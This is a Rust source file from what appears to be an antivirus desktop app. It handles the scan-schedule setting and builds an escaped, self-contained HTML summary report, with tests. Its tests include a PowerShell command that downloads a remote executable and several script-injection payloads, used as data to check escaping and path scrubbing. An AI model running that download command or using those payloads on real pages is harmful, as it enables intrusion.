//! The scheduled-scan setting and the saved summary report.
//!
//! None of this is reachable from synced (remote) commands or the bot. The page never chooses
//! where the report goes or what is in it: it sends only the number of days and whether
//! folder names are wanted. The file is written by the app, as the signed-in user.

use super::{blocking, config, display, elevated, fresh_status, is_permission_error};
use chrono::{DateTime, Duration, Local, Utc};
use serde::Serialize;
use std::collections::BTreeMap;
use std::fs::{self, File, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use the_nex_core::config::{AppConfig, RuntimeToggles};
use the_nex_core::engine::{self, QuickScanReport, ScanKind};
use the_nex_core::platform;
use the_nex_core::quarantine::{Severity, ThreatEvent};
use the_nex_core::schedule::{self, ScanSchedule};

// ---- scheduled scan setting ----------------------------------------------------------------

#[derive(Serialize)]
pub struct LastScheduled {
    finished_at: String,
    files_examined: u64,
    findings: usize,
    unreadable: usize,
    cancelled: bool,
    truncated: bool,
}

#[derive(Serialize)]
pub struct ScheduleInfo {
    schedule: ScanSchedule,
    last_run: Option<DateTime<Utc>>,
    last_scan: Option<LastScheduled>,
}

fn schedule_info(cfg: &AppConfig) -> Result<ScheduleInfo, String> {
    let toggles = RuntimeToggles::load(&cfg.settings_file).map_err(|e| e.to_string())?;
    Ok(ScheduleInfo {
        schedule: toggles.scan_schedule,
        last_run: schedule::read_state(cfg).last_run,
        last_scan: engine::read_scan_report(cfg, ScanKind::Scheduled).map(|r| LastScheduled {
            finished_at: r.finished_at,
            files_examined: r.files_examined,
            findings: r.findings.len(),
            unreadable: r.unreadable.len(),
            cancelled: r.cancelled,
            truncated: r.truncated,
        }),
    })
}

#[tauri::command]
pub fn get_scan_schedule() -> Result<ScheduleInfo, String> {
    schedule_info(&config())
}

/// Writes the setting directly where the data folder allows it, else through the administrator
/// prompt, like `toggle_engine`.
#[tauri::command]
pub async fn set_scan_schedule(schedule: String) -> Result<ScheduleInfo, String> {
    blocking(move || {
        let schedule = ScanSchedule::parse(&schedule).ok_or("Choose off, daily or weekly")?;
        let cfg = config();
        let mut toggles = RuntimeToggles::load(&cfg.settings_file).map_err(|e| e.to_string())?;
        toggles.scan_schedule = schedule;
        match toggles.save(&cfg.settings_file) {
            Ok(()) => {}
            Err(e) if is_permission_error(&e) => {
                elevated(&["--set", &format!("scan_schedule={}", schedule.key())])?
            }
            Err(e) => return Err(format!("{}: {e}", cfg.settings_file.display())),
        }
        schedule_info(&cfg)
    })
    .await
}

// ---- summary report ------------------------------------------------------------------------

const MAX_KEYS: usize = 100;
const MAX_KEY_CHARS: usize = 60;
const MAX_LISTED: usize = 50;
const OTHER: &str = "(other)";

#[derive(Default, Debug)]
struct Tally {
    events: u64,
    threats: u64,
    by_type: BTreeMap<String, u64>,
    by_action: BTreeMap<String, u64>,
    /// Oldest event in the log files, in or out of the range: where the history really starts.
    oldest: Option<DateTime<Utc>>,
}

fn is_scan_summary(threat_type: &str) -> bool {
    ["QUICK_SCAN", "FULL_SCAN", engine::SCHEDULED_SCAN_EVENT].contains(&threat_type)
}

/// Event text is whatever a file or process was called, so the number and size of the keys is
/// bounded: one hostile log must not make the report grow without limit.
fn bump(map: &mut BTreeMap<String, u64>, key: &str) {
    let key: String = key.chars().take(MAX_KEY_CHARS).collect();
    let key = if map.contains_key(&key) || map.len() < MAX_KEYS {
        key
    } else {
        OTHER.to_string()
    };
    *map.entry(key).or_insert(0) += 1;
}

/// Streams every line once (like `count_threats`), so a log of any size is counted whole.
/// Lines that do not parse are skipped. The range is `start <= time <= end`.
fn tally(mut reader: impl BufRead, start: DateTime<Utc>, end: DateTime<Utc>) -> io::Result<Tally> {
    let mut out = Tally::default();
    let mut line = Vec::new();
    loop {
        line.clear();
        if reader.read_until(b'\n', &mut line)? == 0 {
            return Ok(out);
        }
        let Ok(event) = serde_json::from_slice::<ThreatEvent>(&line) else {
            continue;
        };
        if out.oldest.is_none_or(|t| event.timestamp < t) {
            out.oldest = Some(event.timestamp);
        }
        if event.timestamp < start || event.timestamp > end {
            continue;
        }
        out.events += 1;
        if event.severity != Severity::Low && !is_scan_summary(&event.threat_type) {
            out.threats += 1;
        }
        bump(&mut out.by_type, &event.threat_type);
        let action = event
            .action_taken
            .split(|c: char| c.is_whitespace() || c == ';' || c == ':')
            .next()
            .filter(|word| !word.is_empty())
            .unwrap_or("(none)")
            .to_uppercase();
        bump(&mut out.by_action, &action);
    }
}

fn is_separator(c: char) -> bool {
    c == '\\' || c == '/'
}

/// Replaces the account name in home-folder paths (`C:\Users\name\`, `/Users/name/`,
/// `/home/name/`); the same rule as `scrub` in ui/report.js, and tested with the same cases.
fn scrub(text: &str) -> String {
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    'next: while i < chars.len() {
        out.push(chars[i]);
        if is_separator(chars[i]) {
            for word in ["users", "home"] {
                let end = i + 1 + word.len();
                let matches = chars.get(i + 1..end).is_some_and(|w| {
                    w.iter()
                        .zip(word.chars())
                        .all(|(a, b)| a.to_ascii_lowercase() == b)
                }) && chars.get(end).is_some_and(|&c| is_separator(c));
                if !matches {
                    continue;
                }
                let name_end = (end + 1..chars.len())
                    .find(|&k| "\\/\"'<>|:*?\r\n".contains(chars[k]))
                    .unwrap_or(chars.len());
                if name_end > end + 1 {
                    out.extend(&chars[i + 1..=end]);
                    out.push('…');
                    i = name_end;
                    continue 'next;
                }
            }
        }
        i += 1;
    }
    out
}

fn file_name(path: &str) -> &str {
    path.rsplit(is_separator)
        .find(|part| !part.is_empty())
        .unwrap_or(path)
}

fn esc(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            c => out.push(c),
        }
    }
    out
}

fn when(t: DateTime<Utc>) -> String {
    t.with_timezone(&Local)
        .format("%d %b %Y, %H:%M %Z")
        .to_string()
}

struct Protection {
    service_running: bool,
    service_installed: bool,
    version: Option<String>,
    engines: Vec<(&'static str, bool)>,
    dry_run: bool,
    full_disk_access: Option<bool>,
    platform: &'static str,
}

struct Input<'a> {
    now: DateTime<Utc>,
    days: u32,
    include_folders: bool,
    start: DateTime<Utc>,
    tally: &'a Tally,
    protection: &'a Protection,
    scans: Vec<(&'static str, Option<QuickScanReport>)>,
}

fn counts_table(rows: &BTreeMap<String, u64>, heading: &str) -> String {
    if rows.is_empty() {
        return format!("<h3>{heading}</h3><p>Nothing was recorded.</p>");
    }
    let mut sorted: Vec<_> = rows.iter().collect();
    sorted.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
    let body: String = sorted
        .iter()
        .map(|(name, n)| format!("<tr><td>{}</td><td class=\"n\">{n}</td></tr>", esc(name)))
        .collect();
    format!("<h3>{heading}</h3><table>{body}</table>")
}

fn scan_section(title: &str, report: &Option<QuickScanReport>, include_folders: bool) -> String {
    let Some(r) = report else {
        return format!("<h3>{title}</h3><p>No scan of this kind has been run yet.</p>");
    };
    let finished = DateTime::parse_from_rfc3339(&r.finished_at)
        .map(|t| when(t.with_timezone(&Utc)))
        .unwrap_or_else(|_| "an unknown time".to_string());
    let mut out = format!(
        "<h3>{title}</h3><p>Finished {}. {} files looked at, {} flagged.{}{}{}</p>",
        esc(&finished),
        r.files_examined,
        r.findings.len(),
        if r.cancelled {
            " It was stopped early."
        } else {
            ""
        },
        if r.truncated {
            " It hit its file limit, so some files were not looked at."
        } else {
            ""
        },
        if r.unreadable.is_empty() {
            String::new()
        } else {
            format!(
                " {} folder(s) could not be opened, so they were not checked.",
                r.unreadable.len()
            )
        },
    );
    if !r.findings.is_empty() {
        out += "<ul>";
        for f in r.findings.iter().take(MAX_LISTED) {
            let path = f.path.display().to_string();
            let folder = if include_folders {
                let dir = path.strip_suffix(file_name(&path)).unwrap_or("");
                format!(
                    " <span class=\"muted\">in {}</span>",
                    esc(&scrub(dir.trim_end_matches(is_separator)))
                )
            } else {
                String::new()
            };
            out += &format!(
                "<li><b>{}</b>{folder} &mdash; {} <span class=\"muted\">{}</span></li>",
                esc(file_name(&path)),
                esc(&f.threat_type),
                esc(&scrub(&f.detail)),
            );
        }
        if r.findings.len() > MAX_LISTED {
            out += &format!("<li>…and {} more.</li>", r.findings.len() - MAX_LISTED);
        }
        out += "</ul>";
    }
    out
}

/// One self-contained page: no scripts and nothing fetched from anywhere (the policy line says
/// so to the browser too), and every value from the log or a scan goes through `esc`.
fn render(i: &Input) -> String {
    let p = i.protection;
    let t = i.tally;
    let yes_no = |on: bool| if on { "on" } else { "off" };
    let engines: String = p
        .engines
        .iter()
        .map(|(name, on)| format!("<li>{name}: <b>{}</b></li>", yes_no(*on)))
        .collect();
    let service = if p.service_running {
        format!(
            "running{}",
            p.version
                .as_ref()
                .map(|v| format!(" (version {})", esc(v)))
                .unwrap_or_default()
        )
    } else if p.service_installed {
        "installed but not running right now: nothing was being watched at the time of this report"
            .to_string()
    } else {
        "not installed: nothing is being watched in the background".to_string()
    };
    let fda = match p.full_disk_access {
        Some(true) => "granted",
        Some(false) => "not granted, so some folders cannot be scanned",
        None => "not known (macOS only, and only while the service runs)",
    };
    let headline = if t.threats == 0 {
        format!("No threats were recorded in the last {} days.", i.days)
    } else {
        format!(
            "{} threat event(s) were recorded in the last {} days.",
            t.threats, i.days
        )
    };
    let history = match t.oldest {
        Some(oldest) if oldest > i.start => format!(
            "The activity log only goes back to {}, so the start of this range is missing.",
            when(oldest)
        ),
        Some(_) => "The activity log covers the whole range.".to_string(),
        None => "The activity log is empty.".to_string(),
    };
    let scans: String = i
        .scans
        .iter()
        .map(|(title, report)| scan_section(title, report, i.include_folders))
        .collect();
    format!(
        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">\
<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'\">\
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
<title>The Nex summary report</title><style>\
:root{{color-scheme:light dark}}body{{font:16px/1.5 system-ui,sans-serif;max-width:46rem;margin:2rem auto;padding:0 1rem}}\
table{{border-collapse:collapse}}td{{padding:.2rem 1rem .2rem 0}}td.n{{text-align:right;font-variant-numeric:tabular-nums}}\
.muted{{opacity:.7}}h1,h2{{margin-top:2rem}}</style></head><body>\
<h1>The Nex summary report</h1>\
<p>{} to {} (the last {} days). Made on {}.</p>\
<p><b>{}</b></p>\
<h2>Protection when this report was made</h2>\
<ul><li>Background service: {}</li>{engines}<li>Full Disk Access: {}</li><li>Computer: {}</li></ul>\
{}\
<h2>What was recorded</h2>\
<p>{} events in total, {} of them threats.</p>{}{}\
<h2>Latest scans</h2>{scans}\
<h2>What this report cannot tell you</h2><ul>\
<li>{}</li>\
<li>Only events The Nex wrote down are counted. While the background service is stopped nothing is watched and nothing is recorded.</li>\
<li>A scan only looks at the folders it names. The AI check can flag a harmless program, and no scanner finds everything.</li>\
<li>Quick scans you start can move files to quarantine. Full scans and scheduled scans only report.</li>\
<li>{}</li>\
<li>This file was made on this computer and nothing was sent anywhere.</li></ul>\
</body></html>\n",
        esc(&when(i.start)),
        esc(&when(i.now)),
        i.days,
        esc(&when(i.now)),
        esc(&headline),
        esc(&service),
        esc(fda),
        esc(p.platform),
        if p.dry_run {
            "<p><b>Dry run is on:</b> threats are noted but nothing is moved or stopped.</p>"
        } else {
            ""
        },
        t.events,
        t.threats,
        counts_table(&t.by_type, "By kind of event"),
        counts_table(&t.by_action, "By what The Nex did"),
        esc(&history),
        if i.include_folders {
            "Folder names are included, with your account name removed."
        } else {
            "Folder names are left out; only file names are shown."
        },
    )
}

/// Creates the file with a name nobody has used: `create_new` never overwrites, and it refuses
/// to follow a link left under that name, so the next free name is tried instead. The folder
/// itself must be a real folder, not a link to somewhere else.
fn save_unique(dir: &Path, now: DateTime<Utc>, body: &str) -> io::Result<PathBuf> {
    if !fs::symlink_metadata(dir)?.file_type().is_dir() {
        return Err(io::Error::other(format!(
            "{} is not an ordinary folder",
            dir.display()
        )));
    }
    let day = now.with_timezone(&Local).format("%Y-%m-%d");
    for n in 1..=99 {
        let suffix = if n == 1 {
            String::new()
        } else {
            format!("-{n}")
        };
        let path = dir.join(format!("The-Nex-report-{day}{suffix}.html"));
        let mut options = OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        std::os::unix::fs::OpenOptionsExt::mode(&mut options, 0o600);
        match options.open(&path) {
            Ok(mut file) => {
                file.write_all(body.as_bytes())?;
                return Ok(path);
            }
            Err(e) if e.kind() == io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(e),
        }
    }
    Err(io::Error::other("too many reports with today's date"))
}

fn downloads_dir() -> Result<PathBuf, String> {
    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" })
        .ok_or("Your Downloads folder could not be found")?;
    Ok(PathBuf::from(home).join("Downloads"))
}

fn open_log(path: &Path) -> Result<Box<dyn BufRead>, String> {
    match File::open(path) {
        Ok(f) => Ok(Box::new(BufReader::new(f))),
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(Box::new(io::empty())),
        Err(e) => Err(format!("{}: {e}", path.display())),
    }
}

#[tauri::command]
pub async fn save_summary_report(days: u32, include_folders: bool) -> Result<String, String> {
    if days != 7 && days != 30 {
        return Err("Choose 7 or 30 days".to_string());
    }
    blocking(move || {
        let cfg = config();
        let now = Utc::now();
        let start = now - Duration::days(i64::from(days));
        // The rotated file can still hold part of the range, so it is counted first.
        let log =
            open_log(&cfg.events_log.with_extension("jsonl.1"))?.chain(open_log(&cfg.events_log)?);
        let tally =
            tally(log, start, now).map_err(|e| format!("{}: {e}", cfg.events_log.display()))?;
        let status = fresh_status(&cfg);
        let toggles = status
            .as_ref()
            .map(|s| s.toggles)
            .or_else(|| RuntimeToggles::load(&cfg.settings_file).ok())
            .unwrap_or_default();
        let protection = Protection {
            service_running: status.is_some(),
            service_installed: platform::service_installed(),
            version: status.as_ref().map(|s| s.version.clone()),
            engines: vec![
                ("Known-malware list", toggles.known_bad_enabled),
                ("Zip-bomb check", toggles.zip_bomb_enabled),
                ("AI program check", toggles.bin_ai_enabled),
                ("Misused system tools", toggles.process_guard_enabled),
                ("Ransomware decoy files", toggles.canary_enabled),
            ],
            dry_run: status
                .as_ref()
                .map(|s| s.dry_run)
                .unwrap_or(toggles.dry_run),
            full_disk_access: status.as_ref().and_then(|s| s.full_disk_access),
            platform: std::env::consts::OS,
        };
        let scans = [
            ("Scheduled scan (report only)", ScanKind::Scheduled),
            ("Full scan (report only)", ScanKind::Full),
            ("Quick scan", ScanKind::Quick),
        ]
        .into_iter()
        .map(|(title, kind)| (title, engine::read_scan_report(&cfg, kind)))
        .collect();
        let html = render(&Input {
            now,
            days,
            include_folders,
            start,
            tally: &tally,
            protection: &protection,
            scans,
        });
        save_unique(&downloads_dir()?, now, &html)
            .map(|path| display(&path))
            .map_err(|e| format!("The report could not be saved in your Downloads folder: {e}"))
    })
    .await
}

#[cfg(test)]
mod tests {
    use super::*;
    use the_nex_core::engine::QuickScanFinding;

    fn line(ms: i64, kind: &str, severity: Severity, action: &str) -> String {
        let mut e = ThreatEvent::new(kind, severity, "t", action, "d");
        e.timestamp = DateTime::from_timestamp_millis(ms).unwrap();
        serde_json::to_string(&e).unwrap() + "\n"
    }

    fn at(ms: i64) -> DateTime<Utc> {
        DateTime::from_timestamp_millis(ms).unwrap()
    }

    fn quiet() -> Protection {
        Protection {
            service_running: false,
            service_installed: true,
            version: None,
            engines: vec![("Zip-bomb check", true), ("AI program check", false)],
            dry_run: true,
            full_disk_access: None,
            platform: "macos",
        }
    }

    fn render_with(
        tally: &Tally,
        scans: Vec<(&'static str, Option<QuickScanReport>)>,
        folders: bool,
    ) -> String {
        render(&Input {
            now: at(2_000_000_000_000),
            days: 7,
            include_folders: folders,
            start: at(2_000_000_000_000 - 7 * 86_400_000),
            tally,
            protection: &quiet(),
            scans,
        })
    }

    #[test]
    fn account_names_are_removed_like_the_page_does_it() {
        // The same cases as scripts/test_report.js.
        assert_eq!(
            scrub("C:\\Users\\John Smith\\Downloads\\a.exe"),
            "C:\\Users\\…\\Downloads\\a.exe"
        );
        assert_eq!(
            scrub("/Users/alex/Library/x and /home/sam/y"),
            "/Users/…/Library/x and /home/…/y"
        );
        assert_eq!(
            scrub("powershell -c iwr http://x/p -o c:/users/BOB/p.exe"),
            "powershell -c iwr http://x/p -o c:/users/…/p.exe"
        );
        assert_eq!(
            scrub("score=0.97 threshold=0.65; packed code"),
            "score=0.97 threshold=0.65; packed code"
        );
        assert_eq!(scrub("/Users/"), "/Users/");
        assert_eq!(scrub("/home//x"), "/home//x");
        assert_eq!(file_name("C:\\Users\\bob\\evil.exe"), "evil.exe");
        assert_eq!(
            file_name("powershell.exe (pid 8842)"),
            "powershell.exe (pid 8842)"
        );
    }

    #[test]
    fn counts_cover_every_event_in_both_files_and_stop_at_the_range_edges() {
        const DAY: i64 = 86_400_000;
        let (start, end) = (at(10 * DAY), at(17 * DAY));
        let mut rotated = String::new();
        rotated += &line(10 * DAY - 1, "ZIP_BOMB", Severity::High, "QUARANTINED id=a");
        rotated += &line(10 * DAY, "ZIP_BOMB", Severity::High, "QUARANTINED id=b");
        let mut current = String::new();
        for _ in 0..3000 {
            current += &line(
                12 * DAY,
                "KNOWN_MALWARE",
                Severity::Critical,
                "QUARANTINED id=c",
            );
        }
        current += &line(13 * DAY, "FULL_SCAN", Severity::High, "1 threat(s) found");
        current += &line(14 * DAY, "QUARANTINE_RESTORE", Severity::Low, "RESTORED");
        current += &line(
            17 * DAY,
            "ZIP_BOMB",
            Severity::High,
            "DRY_RUN: would quarantine",
        );
        current += &line(
            17 * DAY + 1,
            "ZIP_BOMB",
            Severity::High,
            "QUARANTINED id=late",
        );
        current += "not json\n{\"id\":\n";
        let log = rotated.as_bytes().chain(current.as_bytes());
        let t = tally(log, start, end).unwrap();
        assert_eq!(t.events, 3004);
        assert_eq!(
            t.threats, 3002,
            "a scan's own summary and a low note are not threats"
        );
        assert_eq!(t.by_type["KNOWN_MALWARE"], 3000);
        assert_eq!(t.by_type["ZIP_BOMB"], 2);
        assert_eq!(t.by_action["QUARANTINED"], 3001);
        assert_eq!(t.by_action["DRY_RUN"], 1);
        assert_eq!(t.by_action["RESTORED"], 1);
        assert_eq!(t.oldest, Some(at(10 * DAY - 1)));

        let empty = tally(io::empty(), start, end).unwrap();
        assert_eq!((empty.events, empty.threats, empty.oldest), (0, 0, None));
        let page = render_with(&empty, Vec::new(), false);
        assert!(page.contains("No threats were recorded in the last 7 days."));
        assert!(page.contains("The activity log is empty."));
        assert!(page.contains("installed but not running right now"));
    }

    #[test]
    fn hostile_event_text_is_counted_in_bounded_buckets_and_escaped() {
        let mut map = BTreeMap::new();
        for n in 0..(MAX_KEYS + 25) {
            bump(&mut map, &format!("<script>alert({n})</script>"));
        }
        assert_eq!(map.len(), MAX_KEYS + 1);
        assert_eq!(map[OTHER], 25);
        bump(&mut map, &"x".repeat(500));
        assert!(map
            .keys()
            .all(|k| k.chars().count() <= MAX_KEY_CHARS.max(OTHER.len())));

        let mut t = Tally::default();
        t.by_type
            .insert("<img src=x onerror=alert(1)>".to_string(), 1);
        t.by_action.insert("\"><script>".to_string(), 1);
        let report = QuickScanReport {
            files_examined: 3,
            finished_at: Utc::now().to_rfc3339(),
            findings: vec![QuickScanFinding {
                path: PathBuf::from("/Users/alex/Downloads/<script>alert(1).exe"),
                threat_type: "<b>MALWARE_AI</b>".to_string(),
                detail: "see /Users/alex/Downloads & more".to_string(),
            }],
            ..QuickScanReport::default()
        };
        for folders in [false, true] {
            let page = render_with(&t, vec![("Quick scan", Some(report.clone()))], folders);
            assert!(!page.contains("<script"), "{page}");
            assert!(!page.contains("<img") && !page.contains("<b>MALWARE_AI"));
            assert!(page.contains("&lt;script&gt;alert(1).exe"));
            assert!(
                !page.contains("alex"),
                "the account name is removed everywhere"
            );
            assert!(page.contains("/Users/…/Downloads"));
            // The folder shows only when asked for; the file name always does.
            assert_eq!(page.contains("in /Users/…/Downloads"), folders);
            assert!(page.contains("default-src 'none'"));
            assert!(!page.contains("http://") && !page.contains("https://"));
        }
    }

    #[test]
    fn reports_are_saved_under_a_new_name_and_never_over_or_through_anything() {
        let root = std::env::temp_dir().join(format!("thenex-report-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        let downloads = root.join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let now = Utc::now();
        let first = save_unique(&downloads, now, "one").unwrap();
        let second = save_unique(&downloads, now, "two").unwrap();
        assert_ne!(first, second);
        assert_eq!(fs::read_to_string(&first).unwrap(), "one");
        assert_eq!(fs::read_to_string(&second).unwrap(), "two");

        #[cfg(unix)]
        {
            use std::os::unix::fs::{symlink, PermissionsExt};
            // A link left under the next name (to a file the user cares about) is not written
            // through: the report goes to the name after it.
            let precious = root.join("precious.txt");
            fs::write(&precious, "keep").unwrap();
            let next = second.with_file_name(
                second
                    .file_name()
                    .unwrap()
                    .to_str()
                    .unwrap()
                    .replace("-2.html", "-3.html"),
            );
            symlink(&precious, &next).unwrap();
            let third = save_unique(&downloads, now, "three").unwrap();
            assert_ne!(third, next);
            assert_eq!(fs::read_to_string(&precious).unwrap(), "keep");
            assert_eq!(
                fs::metadata(&third).unwrap().permissions().mode() & 0o077,
                0
            );
            // A Downloads folder that is itself a link is refused.
            let link = root.join("Downloads-link");
            symlink(&downloads, &link).unwrap();
            assert!(save_unique(&link, now, "x").is_err());
        }
        assert!(save_unique(&root.join("missing"), now, "x").is_err());
        let _ = fs::remove_dir_all(&root);
    }
}
